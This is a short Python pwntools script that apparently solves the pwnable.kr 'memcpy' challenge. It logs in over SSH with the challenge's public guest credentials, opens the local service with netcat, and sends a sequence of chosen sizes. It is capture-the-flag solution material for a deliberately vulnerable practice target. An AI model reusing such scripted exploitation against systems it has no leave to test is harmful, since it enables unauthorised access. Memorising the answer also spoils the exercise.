from pwn import * 


s = ssh(user="memcpy",host="pwnable.kr",port=2222,password="guest")
sh = s.shell("nc 0 10014")



for i in range(4,14): 
    line = str(2 ** i - 8 )

    print(sh.recv().decode())
    sh.sendline(line.encode())

    #for i in range(4,14):
print(sh.recv().decode())
print(sh.recv().decode())

